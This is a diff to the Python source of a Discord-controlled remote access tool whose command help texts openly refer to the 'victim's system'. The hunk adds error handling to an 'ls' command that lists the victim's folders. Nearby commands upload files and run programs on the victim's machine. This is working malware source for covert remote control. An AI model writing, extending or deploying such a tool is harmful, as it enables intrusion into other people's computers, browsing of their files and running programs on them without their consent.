@@ -388,31 +388,34 @@ async def upload(ctx, folder: str = None):
         
 @bot.command(help="Lists contents of a folder on victim's system, format $ls {folder (D:/folder/)}")
 async def ls(ctx, path: str = None):
-    if not path:
-        await ctx.reply("Error: No path provided. Please specify a directory path to list.")
-        return
-    if not os.path.exists(path):
-        await ctx.reply(f"Error: The path '{path}' does not exist.")
-        return
-    if not os.path.isdir(path):
-        await ctx.reply(f"Error: The path '{path}' is not a directory.")
-        return
-    items = os.listdir(path)
-    parent_dir = os.path.abspath(os.path.join(path, os.pardir))
-    dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
-    files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
-    response = f"​\n**Parent Directory**: `{parent_dir}`\n\n"
-    if dirs or files:
-        for directory in dirs:
-            dir_full_path = os.path.join(path, directory)
-            response += f"`[DIR]  {directory}: {dir_full_path}`\n"
-        for file in files:
-            file_full_path = os.path.join(path, file)
-            response += f"`[FILE] {file}: {file_full_path}`\n"
-    else:
-        response += "`This directory is empty.`"
+    try:
+        if not path:
+            await ctx.reply("Error: No path provided. Please specify a directory path to list.")
+            return
+        if not os.path.exists(path):
+            await ctx.reply(f"Error: The path '{path}' does not exist.")
+            return
+        if not os.path.isdir(path):
+            await ctx.reply(f"Error: The path '{path}' is not a directory.")
+            return
+        items = os.listdir(path)
+        parent_dir = os.path.abspath(os.path.join(path, os.pardir))
+        dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
+        files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
+        response = f"​\n**Parent Directory**: `{parent_dir}`\n\n"
+        if dirs or files:
+            for directory in dirs:
+                dir_full_path = os.path.join(path, directory)
+                response += f"`[DIR]  {directory}: {dir_full_path}`\n"
+            for file in files:
+                file_full_path = os.path.join(path, file)
+                response += f"`[FILE] {file}: {file_full_path}`\n"
+        else:
+            response += "`This directory is empty.`"
 
-    await ctx.reply(f"{response}")
+        await ctx.reply(f"{response}")
+    except Exception as e:
+        await ctx.reply(f"Error: Could not execute the file. {str(e)}")   
 
 @bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
 async def run(ctx, file_path: str = None):
